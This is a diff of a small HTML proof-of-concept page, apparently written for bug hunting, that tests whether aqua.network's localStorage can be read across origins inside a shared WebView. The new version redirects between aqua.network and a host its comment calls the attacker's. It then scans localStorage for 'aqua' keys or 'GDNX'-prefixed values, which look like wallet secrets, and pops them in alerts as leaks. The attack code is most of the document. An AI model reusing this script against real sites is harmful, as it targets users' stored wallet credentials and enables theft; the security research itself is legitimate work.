@@ -1,12 +1,19 @@
-<button onclick="test()">TEST UXSS</button>
+<button onclick="method1()">1. SAME-TAB LEAK (REAL BUG)</button>
+<button onclick="method2()">2. Direct READ - Cek leak sekarang</button>
+
 <script>
-function test(){
-  let win = window.open('https://aqua.network','_blank');
-  setTimeout(()=>{
-    try{
-      alert('aqua ls: '+win.localStorage.length);
-      alert('LEAK: '+win.localStorage.getItem('wc:blabla'));
-    }catch(e){ alert('BLOCKED: '+e.message) }
-  }, 3000);
+function method1(){
+  if(location.hostname.includes('aqua.network')){
+    localStorage.setItem('aqua_secret','GDNXOLVF...7DS3PQZY-REAL-'+Date.now());
+    location.href='https://0x403for.github.io'; // balik ke attacker di WebView yang sama
+  } else {
+    location.href='https://aqua.network'; // pergi ke aqua.network dulu
+  }
+}
+function method2(){
+  for(let i=0;i<localStorage.length;i++){
+    let k=localStorage.key(i); let v=localStorage.getItem(k)||'';
+    if(k.includes('aqua')||v.includes('GDNX')) alert('LEAK: '+k+'='+v);
+  }
 }
 </script>
